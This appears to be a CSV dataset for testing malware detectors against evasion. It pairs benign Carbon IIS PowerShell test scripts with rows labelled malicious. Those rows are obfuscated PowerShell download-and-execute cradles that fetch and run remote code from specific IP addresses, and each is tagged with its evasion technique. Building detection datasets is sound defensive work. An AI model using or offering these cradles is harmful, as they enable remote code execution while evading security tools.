filename,label,content,pair_idx,pair_role,pair_indicator,pair_strategy,source_pair_idx,seed_id,technique_id,evasion_success
1107.ps1,benign,"$Port = 9878
$SiteName = 'TestApplication'
$AppName = 'App'
$WebConfig = Join-Path $TestDir web.config
$AppPoolName = 'TestApplication'

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisAppPool -Name $AppPoolName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port""
    if( TEst-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-InstallApplication($Path = $TestDir)
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $Path -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Is $result ([Microsoft.Web.Administration.Application])
    Assert-FileDoesNotExist $WebConfig
}

function Test-ShouldNotReturnAnything($Path = $TestDir)
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $Path 
    Assert-NoError
    Assert-Null $result
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $env:TEMP
    Assert-NoError
    Assert-Null $result
}

function Test-ShouldCreateApplication
{
    Invoke-InstallApplication
    Assert-ApplicationRunning
    $app = Get-IisApplication -SiteName $SiteName -VirtualPath $AppName
    Assert-NotNull $app
    Assert-Equal $AppPoolName $app.ApplicationPoolName
}

function Test-ShouldResolveApplicationPhysicalPath
{
    Invoke-InstallApplication -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisApplication -SiteName $SiteName -Name $AppName | 
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Like $TestDir $physicalPath
}

function Test-ShouldChangePathOfExistingApplication
{
    Invoke-InstallApplication -Path ""$TestDir\..\..""
    $app = Get-IisApplication -SiteName $SiteName -Name $AppName
    Assert-NotNull $app
    Assert-Equal ([IO.Path]::GetFullPath( ""$TestDir\..\.."" )) $app.PhysicalPath

    Invoke-InstallApplication -Path $TestDir
    $app = Get-IisApplication -SiteName $SiteName -Name $AppName
    Assert-NotNull $app
    Assert-Equal $TestDir $app.PhysicalPath
}

function Test-ShouldUpdatePath
{
    Invoke-InstallApplication -Path $env:SystemRoot
    Invoke-InstallApplication
    Assert-ApplicationRunning
    $result = Install-IisApplication -SiteName $SiteName -VirtualPath $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName
    Assert-Null $result
}

function Test-ShouldUpdateApplicationPool
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $TestDir -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal 'DefaultAppPool' $result.ApplicationPoolName
    Assert-ApplicationRunning

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal $AppPoolName $result.ApplicationPoolName

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal $AppPoolName $result.ApplicationPoolName
}

function Test-ShouldCreateApplicationDirectory
{
    $appDir = Join-Path $TestDir ApplicationDirectory
    if( Test-Path $appDir -PathType Container )
    {
        Remove-Item $appDir -Force
    }

    try
    {
        $result = Invoke-InstallApplication -Path $appDir
        Assert-Null $result
        Assert-DirectoryExists $appDir
    }
    finally
    {
        if( Test-Path $appDir -PathType Container )
        {
            Remove-Item $appDir -Force
        }
    }
}

function Assert-ApplicationRunning($appName)
{
    $html = Read-Url ""http://localhost:$Port/$appName/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new application.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 5
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",32,benign,DownloadString,evasion_probe,165,seed_109e3e5424a0,iex_scriptblock_create,False
338__seed_109e3e5424a0__iex_scriptblock_create.ps1,malicious,&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt'))),32,malicious,DownloadString,evasion_probe,165,seed_109e3e5424a0,iex_scriptblock_create,False
1107.ps1,benign,"$Port = 9878
$SiteName = 'TestApplication'
$AppName = 'App'
$WebConfig = Join-Path $TestDir web.config
$AppPoolName = 'TestApplication'

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisAppPool -Name $AppPoolName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port""
    if( TEst-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-InstallApplication($Path = $TestDir)
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $Path -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Is $result ([Microsoft.Web.Administration.Application])
    Assert-FileDoesNotExist $WebConfig
}

function Test-ShouldNotReturnAnything($Path = $TestDir)
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $Path 
    Assert-NoError
    Assert-Null $result
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $env:TEMP
    Assert-NoError
    Assert-Null $result
}

function Test-ShouldCreateApplication
{
    Invoke-InstallApplication
    Assert-ApplicationRunning
    $app = Get-IisApplication -SiteName $SiteName -VirtualPath $AppName
    Assert-NotNull $app
    Assert-Equal $AppPoolName $app.ApplicationPoolName
}

function Test-ShouldResolveApplicationPhysicalPath
{
    Invoke-InstallApplication -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisApplication -SiteName $SiteName -Name $AppName | 
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Like $TestDir $physicalPath
}

function Test-ShouldChangePathOfExistingApplication
{
    Invoke-InstallApplication -Path ""$TestDir\..\..""
    $app = Get-IisApplication -SiteName $SiteName -Name $AppName
    Assert-NotNull $app
    Assert-Equal ([IO.Path]::GetFullPath( ""$TestDir\..\.."" )) $app.PhysicalPath

    Invoke-InstallApplication -Path $TestDir
    $app = Get-IisApplication -SiteName $SiteName -Name $AppName
    Assert-NotNull $app
    Assert-Equal $TestDir $app.PhysicalPath
}

function Test-ShouldUpdatePath
{
    Invoke-InstallApplication -Path $env:SystemRoot
    Invoke-InstallApplication
    Assert-ApplicationRunning
    $result = Install-IisApplication -SiteName $SiteName -VirtualPath $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName
    Assert-Null $result
}

function Test-ShouldUpdateApplicationPool
{
    $result = Install-IISApplication -SiteName $SiteName -Name $AppName -Path $TestDir -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal 'DefaultAppPool' $result.ApplicationPoolName
    Assert-ApplicationRunning

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal $AppPoolName $result.ApplicationPoolName

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -AppPoolName $AppPoolName -PassThru
    Assert-NoError
    Assert-NotNull $result

    $result = Install-IisApplication -SiteName $SiteName -Name $AppName -PhysicalPath $TestDir -PassThru
    Assert-NoError
    Assert-NotNull $result
    Assert-Equal $AppPoolName $result.ApplicationPoolName
}

function Test-ShouldCreateApplicationDirectory
{
    $appDir = Join-Path $TestDir ApplicationDirectory
    if( Test-Path $appDir -PathType Container )
    {
        Remove-Item $appDir -Force
    }

    try
    {
        $result = Invoke-InstallApplication -Path $appDir
        Assert-Null $result
        Assert-DirectoryExists $appDir
    }
    finally
    {
        if( Test-Path $appDir -PathType Container )
        {
            Remove-Item $appDir -Force
        }
    }
}

function Assert-ApplicationRunning($appName)
{
    $html = Read-Url ""http://localhost:$Port/$appName/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new application.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 5
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",33,benign,DownloadString,evasion_probe,165,seed_109e3e5424a0,downloadstring_psobject_invoke,False
338__seed_109e3e5424a0__downloadstring_psobject_invoke.ps1,malicious,IEX (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://91.120.23.152/wizz.txt'),33,malicious,DownloadString,evasion_probe,165,seed_109e3e5424a0,downloadstring_psobject_invoke,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",34,benign,DownloadString,evasion_probe,167,seed_36e17531a823,iex_call_operator_string,False
cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__iex_call_operator_string.ps1,malicious,&('I'+'EX') ((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'));,34,malicious,DownloadString,evasion_probe,167,seed_36e17531a823,iex_call_operator_string,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",35,benign,DownloadString,evasion_probe,167,seed_36e17531a823,iex_scriptblock_create,False
cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__iex_scriptblock_create.ps1,malicious,&([scriptblock]::Create(((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'))));,35,malicious,DownloadString,evasion_probe,167,seed_36e17531a823,iex_scriptblock_create,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",36,benign,DownloadString,evasion_probe,167,seed_36e17531a823,downloadstring_psobject_invoke,False
cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__downloadstring_psobject_invoke.ps1,malicious,IEX ((New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://192.168.137.241:8080/'));,36,malicious,DownloadString,evasion_probe,167,seed_36e17531a823,downloadstring_psobject_invoke,False
1098.ps1,benign,"$Port = 9878
$SiteName = 'TestVirtualDirectory'
$VDirName = 'VDir'
$WebConfig = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $SiteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $SiteName
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port"" -AppPoolName $SiteName
    if( Test-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-NewVirtualDirectory($Path = $TestDir)
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path $Path
    Assert-LastProcessSucceeded 'Failed to create virtual directory.'
}

function Test-ShouldCreateVirtualDirectory
{
    $output = Invoke-NewVirtualDirectory
    Assert-Null $output
    Assert-VirtualDirectoryRunning
}

function Test-ShouldHandleExtraDirectorySeparatorCharacter
{
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath ('/{0}/' -f $VDirName) -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning
    $website = Get-IisWebsite -Name $SiteName
    Assert-Equal ('/{0}' -f $VDirName) ($website.Applications[0].VirtualDirectories[1].Path)
}

function Test-ShouldResolvePhysicalPath
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisWebsite -SiteName $SiteName |
                        Select-Object -ExpandProperty Applications |
                        Where-Object { $_.Path -eq '/' } |
                        Select-Object -ExpandProperty VirtualDirectories |
                        Where-Object { $_.Path -eq ""/$VDirName"" } |
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Equal $TestDir $physicalPath
}

function Test-ShouldUpdatePhysicalPath
{
    Invoke-NewVirtualDirectory -Path $env:SystemRoot
    Invoke-NewVirtualDirectory
    Assert-VirtualDirectoryRunning
}

function Test-ShouldCreateDoubleVitualDirectory
{
    $virtualPath = '{0}/{0}' -f $VDirName
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $virtualPath -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning $virtualPath
}

function Test-ShouldTurnOnDirectoryBrowsing
{
    Invoke-NewVirtualDirectory
    Enable-IisDirectoryBrowsing -SiteName $SiteName -Path $VDirName
    Assert-LastProcessSucceeded 'Failed to enable directory browsing.'
    Assert-FileDoesNotExist $WebConfig 'Changes not committed to apphost config level.'
    $numTries = 0
    $maxTries = 10
    $foundDirectoryListing = $false
    do
    {
        $output = Read-Url ""http://localhost:$Port/$VDirName""
        if( $output -like '*NewWebsite.html*' )
        {
            $foundDirectoryListing = $true
            break
        }
        $numTries += 1
        Start-Sleep -Milliseconds 100
    }
    while( $numTries -lt $maxTries )
    Assert-True $foundDirectoryListing ""Didn't get directory list.""
}

function Test-ShouldDeleteIfForced
{
    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-NotNull $vdir

    $defaultLogonMethod = $vdir.LogonMethod
    Assert-NotEqual 2 $defaultLogonMethod
    $vdir.LogonMethod = 2
    $app.CommitChanges()

    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot -Force
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-Equal $defaultLogonMethod $vdir.LogonMethod
}

function Assert-VirtualDirectoryRunning($vdir)
{
    $html = Read-Url ""http://localhost:$Port/$vdir/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new virtual directory.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 10
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",37,benign,DownloadString,evasion_probe,168,seed_eb139569f490,iex_call_operator_string,False
